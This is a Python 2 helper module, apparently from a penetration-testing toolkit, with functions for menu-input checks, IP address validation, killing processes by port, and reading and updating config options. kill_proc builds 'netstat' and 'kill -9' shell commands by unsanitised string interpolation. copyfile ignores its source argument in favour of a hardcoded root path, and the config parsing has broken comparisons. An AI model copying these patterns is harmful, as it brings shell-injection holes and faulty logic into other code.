def check_length(choice,max):
	# start initital loop
	counter = 0
	while 1:
		if counter == 1:
			choice = raw_input(bcolors.YELLOW + bcolors.BOLD + "[!] " + bcolors.ENDC + "Invalid choice try again: ")
		# try block in case its not a integer
		try:
			# check to see if its an integer
			choice = int(choice)
			# okay its an integer lets do the compare
			if choice > max:
				# trigger an exception as not an int
				choice = "blah"
				choice = int(choice)

			# if everythings good return the right choice
			return choice

		# oops, not a integer 
		except Exception:
			counter = 1

# valid if IP address is legit
def is_valid_ip(ip):
    return is_valid_ipv4(ip) or is_valid_ipv6(ip)

# ipv4
def is_valid_ipv4(ip):
    pattern = re.compile(r"""
        ^
        (?:
          # Dotted variants:
          (?:
            # Decimal 1-255 (no leading 0's)
            [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
          |
            0x0*[0-9a-f]{1,2}  # Hexadecimal 0x0 - 0xFF (possible leading 0's)
          |
            0+[1-3]?[0-7]{0,2} # Octal 0 - 0377 (possible leading 0's)
          )
          (?:                  # Repeat 0-3 times, separated by a dot
            \.
            (?:
              [3-9]\d?|2(?:5[0-5]|[0-4]?\d)?|1\d{0,2}
            |
              0x0*[0-9a-f]{1,2}
            |
              0+[1-3]?[0-7]{0,2}
            )
          ){0,3}
        |
          0x0*[0-9a-f]{1,8}    # Hexadecimal notation, 0x0 - 0xffffffff
        |
          0+[0-3]?[0-7]{0,10}  # Octal notation, 0 - 037777777777
        |
          # Decimal notation, 1-4294967295:
          429496729[0-5]|42949672[0-8]\d|4294967[01]\d\d|429496[0-6]\d{3}|
          42949[0-5]\d{4}|4294[0-8]\d{5}|429[0-3]\d{6}|42[0-8]\d{7}|
          4[01]\d{8}|[1-3]\d{0,9}|[4-9]\d{0,8}
        )
        $
    """, re.VERBOSE | re.IGNORECASE)
    return pattern.match(ip) is not None

# ipv6
def is_valid_ipv6(ip):
    """Validates IPv6 addresses.
    """
    pattern = re.compile(r"""
        ^
        \s*                         # Leading whitespace
        (?!.*::.*::)                # Only a single whildcard allowed
        (?:(?!:)|:(?=:))            # Colon iff it would be part of a wildcard
        (?:                         # Repeat 6 times:
            [0-9a-f]{0,4}           #   A group of at most four hexadecimal digits
            (?:(?<=::)|(?<!::):)    #   Colon unless preceeded by wildcard
        ){6}                        #
        (?:                         # Either
            [0-9a-f]{0,4}           #   Another group
            (?:(?<=::)|(?<!::):)    #   Colon unless preceeded by wildcard
            [0-9a-f]{0,4}           #   Last group
            (?: (?<=::)             #   Colon iff preceeded by exacly one colon
             |  (?<!:)              #
             |  (?<=:) (?<!::) :    #
             )                      # OR
         |                          #   A v4 address with NO leading zeros 
            (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            (?: \.
                (?:25[0-4]|2[0-4]\d|1\d\d|[1-9]?\d)
            ){3}
        )
        \s*                         # Trailing whitespace
        $
    """, re.VERBOSE | re.IGNORECASE | re.DOTALL)
    return pattern.match(ip) is not None


# kill certain processes
def kill_proc(port,flag):
	proc=subprocess.Popen("netstat -antp | grep '%s'" % (port), shell=True, stdout=subprocess.PIPE)
	stdout_value=proc.communicate()[0]
	a=re.search("\d+/%s" % (flag), stdout_value)
	if a:
		b=a.group()
		b=b.replace("/%s" % (flag),"")
		subprocess.Popen("kill -9 %s" % (b), stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True).wait()


# check the config file and return value
def check_config(param):
        fileopen = file("%s/config/set_config" % (definepath), "r")
        for line in fileopen:
		# if the line starts with the param we want then we are set, otherwise if it starts with a # then ignore
		if line.startswith(param) != "#":
			if line.startswith(param):			
				line = line.rstrip()
				# remove any quotes or single quotes
                        	line = line.replace('"', "")
				line = line.replace("'", "")
                        	line = line.split("=")
                        	return line[1]



# copy files from directory
def copyfile(src, dst):
        src = "/root/Desktop/dev/dev/"
        # remove old files
        for root, dirs, files in os.walk(src):
                for f in files:
                        joined = os.path.join(root, f)
                        shutil.copyfile(joined, dst + f)

# this routine will be used to check config options within the set.options
def check_options(option):
        # open the directory
        trigger = 0        
        fileopen = file("%s/src/program_junk/set.options" % (definepath), "r").readlines()
        for line in fileopen:
                match = re.search(option, line)
                if match:
                        line = line.rstrip()
                        line = line.replace('"', "")
                        line = line.split("=")
                        return line[1] 
                        trigger = 1

        if trigger == 0: return trigger

def update_options(option):
        # append to file
        filewrite = file("%s/src/program_junk/set.options" % (definepath), "a")
        filewrite.write(option + "\n")
        filewrite.close()

